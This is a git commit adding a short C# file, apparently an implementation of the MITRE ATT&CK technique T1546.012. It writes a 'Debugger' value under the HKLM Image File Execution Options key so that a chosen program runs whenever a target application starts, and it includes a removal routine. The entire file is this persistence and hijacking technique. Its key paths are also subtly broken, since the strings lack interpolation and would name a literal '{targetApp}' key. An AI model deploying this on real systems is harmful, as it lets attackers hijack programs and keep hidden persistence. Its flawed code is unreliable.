7f166b7bdb8ebd1b0628593c0c71a1e44d32a003
zeroismyhero <zeroismyhero00@gmail.com>
2024-05-23 17:52:01 +0200

    Create IFEOInjection.cs

---
+++ T1546.012/IFEOInjection.cs
@@ -0,0 +1,23 @@
+using System;
+using Microsoft.Win32;
+
+namespace IFEOInjection
+{
+    public class Program
+    {
+        public static void CreateInjection(string targetApp, string injectedApp)
+        {
+            string keyPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{targetApp}";
+            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(keyPath))
+            {
+                key.SetValue("Debugger", injectedApp, RegistryValueKind.String);
+            }
+        }
+
+        public static void RemoveInjection(string targetApp)
+        {
+            string keyPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{targetApp}";
+            Registry.LocalMachine.DeleteSubKey(keyPath, false);
+        }
+    }
+}
